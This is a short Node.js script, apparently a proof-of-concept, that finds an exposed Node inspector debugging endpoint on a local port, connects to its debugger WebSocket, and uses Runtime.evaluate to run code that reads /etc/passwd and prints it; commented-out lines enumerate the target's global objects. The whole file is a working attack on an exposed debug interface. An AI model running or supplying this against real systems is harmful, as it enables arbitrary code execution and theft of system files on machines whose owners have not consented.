const http = require('http');
const WebSocket = require('ws');

// Step 1: Get webSocketDebuggerUrl from /json endpoint
http.get('http://127.0.0.1:6009/json', (res) => {
  let body = '';
  res.on('data', (chunk) => { body += chunk; });
  res.on('end', () => {
    const targets = JSON.parse(body);
    const wsUrl = targets[0]?.webSocketDebuggerUrl;

    if (!wsUrl) {
      console.error("❌ No webSocketDebuggerUrl found.");
      process.exit(1);
    }

    // Step 2: Connect to the debugger WebSocket
    const ws = new WebSocket(wsUrl);

    ws.on('open', () => {
      console.log("✅ Connected to debugger WebSocket");

      // Step 3: Send eval command
      
      ws.send(
        JSON.stringify({
          id: 1,
          method: 'Runtime.evaluate',
          params: {
            expression: "require('fs').readFileSync('/etc/passwd', 'utf-8')",
          },
        })
      );

      // ws.send(JSON.stringify({
      //   id: 1,
      //   method: 'Runtime.evaluate',
      //   params: {
      //     expression: `Object.getOwnPropertyNames(global)`
      //   }
      // }));
    });

    ws.on('message', (data) => {
      const msg = JSON.parse(data);
      if (msg.id === 1) {
        console.log(msg);
        // ws.send(JSON.stringify({
        //   "id": 2,
        //   "method": "Runtime.getProperties",
        //   "params": {
        //     "objectId": msg.result?.result?.objectId,
        //     "ownProperties": true
        //   }
        // }));
      } else if (msg.id === 2) {
        const properties = msg.result?.result.map(element => {
          return element.value.value
        });
        console.log(properties.join(", "));
      } else {
        process.exit(0);
      }

    });

    ws.on('error', (err) => {
      console.error("❌ WebSocket error:", err.message);
      process.exit(1);
    });
  });
}).on('error', (err) => {
  console.error("❌ HTTP error:", err.message);
  process.exit(1);
});